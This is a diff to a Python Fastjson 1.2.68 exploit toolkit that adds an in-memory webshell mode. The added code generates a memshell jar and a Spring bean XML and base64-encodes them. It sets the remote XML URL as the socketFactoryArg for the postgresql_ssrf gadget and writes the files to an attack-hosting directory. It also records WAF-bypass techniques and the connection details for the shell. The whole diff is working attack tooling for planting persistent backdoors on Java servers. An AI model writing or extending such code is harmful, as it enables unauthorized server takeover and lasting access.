@@ -15,6 +15,12 @@ from fastjson_toolkit.poc.echo import (
     supports_1268_echo,
 )
 from fastjson_toolkit.poc.getter import wrap_with_currency
+from fastjson_toolkit.poc.memshell import (
+    build_memshell_delivery,
+    generate_memshell,
+    supports_1268_memshell,
+    write_spring_memshell_attack_files,
+)
 from fastjson_toolkit.poc.v1_2_68.catalog import get_gadget, list_gadgets
 from fastjson_toolkit.poc.v1_2_68.models import (
     Poc1268GenerateOptions,
@@ -32,7 +38,7 @@ COMMON_NOTES = [
     "payload 含重复 @type / StringCodec 畸形写法，勿再 json.dumps 规范化。",
     "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
     "（MiscCodec，与版本无关）。",
-    "命令回显：仅 postgresql_ssrf（Spring ClassPathXml + 远程 echo.jar）支持。",
+    "命令回显 / 内存马：仅 postgresql_ssrf（Spring ClassPathXml + 远程 jar）支持；二者互斥。",
 ]
 
 DEFAULT_ATTACK_BASE = "http://127.0.0.1:18080/attack"
@@ -67,14 +73,62 @@ def generate_poc_1268(
     entry = get_gadget(opts.gadget)
 
     socket_arg = opts.socket_factory_arg
-    echo_on = bool(opts.echo)
+    memshell_on = bool(opts.memshell)
+    echo_on = bool(opts.echo) and not memshell_on
     engine = ""
     cmd_header = ""
     jar_b64: Optional[str] = None
     xml_b64: Optional[str] = None
+    memshell_info: Optional[dict] = None
+    memshell_connect: Optional[str] = None
     extra_notes: list[str] = []
 
-    if echo_on:
+    if memshell_on:
+        if opts.echo:
+            extra_notes.append("memshell 与 echo 互斥，已优先内存马模式")
+        if not supports_1268_memshell(entry.id):
+            raise ValueError(
+                f"gadget={entry.id} 不支持内存马；仅 postgresql_ssrf 可嵌 Spring XML 内存马"
+            )
+        base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        ms = generate_memshell(
+            backend=opts.ms_api,
+            server=opts.ms_server,
+            tool=opts.ms_tool,
+            shell_type=opts.ms_type,
+            url_pattern=opts.ms_path,
+            jdk=opts.ms_jdk,
+            static_initialize=False,
+        )
+        jar_url = f"{base}/memshell.jar"
+        delivery = build_memshell_delivery(ms, jar_url=jar_url)
+        jar_b64 = base64.b64encode(delivery.jar_bytes).decode("ascii")
+        xml_b64 = base64.b64encode(delivery.spring_xml_bytes).decode("ascii")
+        socket_arg = f"{base}/bean-memshell.xml"
+        memshell_info = ms.as_info_dict()
+        memshell_connect = ms.connect_info
+        wrote = False
+        for attack_dir in (_LAB_ATTACK, _FALLBACK_ATTACK):
+            try:
+                write_notes = write_spring_memshell_attack_files(attack_dir, delivery)
+                extra_notes.extend(write_notes)
+                wrote = True
+                break
+            except OSError:
+                continue
+        if not wrote:
+            extra_notes.append(
+                "无法写入 lab attack；请自行托管 memshell.jar + bean-memshell.xml"
+                "（见 attack_*_b64）"
+            )
+        extra_notes.extend(delivery.notes)
+        extra_notes.append(
+            f"内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
+            f"socketFactoryArg → {socket_arg}"
+        )
+        extra_notes.append("连接信息：\n" + memshell_connect)
+
+    elif echo_on:
         if not supports_1268_echo(entry.id):
             raise ValueError(
                 f"gadget={entry.id} 不支持命令回显；仅 postgresql_ssrf 可嵌 Spring XML 回显"
@@ -154,6 +208,9 @@ def generate_poc_1268(
         cmd_header=cmd_header,
         attack_jar_b64=jar_b64,
         attack_xml_b64=xml_b64,
+        memshell=memshell_on,
+        memshell_info=memshell_info,
+        memshell_connect=memshell_connect,
     )
 
 
@@ -167,6 +224,8 @@ def run_poc_1268(
         summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
     if gen.echo:
         summary += f"；echo={gen.engine} header={gen.cmd_header}"
+    if gen.memshell:
+        summary += "；memshell=on"
     result = Poc1268SendResult(
         ok=True,
         gadget=gen.gadget,
@@ -185,6 +244,9 @@ def run_poc_1268(
         cmd_header=gen.cmd_header,
         attack_jar_b64=gen.attack_jar_b64,
         attack_xml_b64=gen.attack_xml_b64,
+        memshell=gen.memshell,
+        memshell_info=gen.memshell_info,
+        memshell_connect=gen.memshell_connect,
     )
     if not opts.send:
         return result
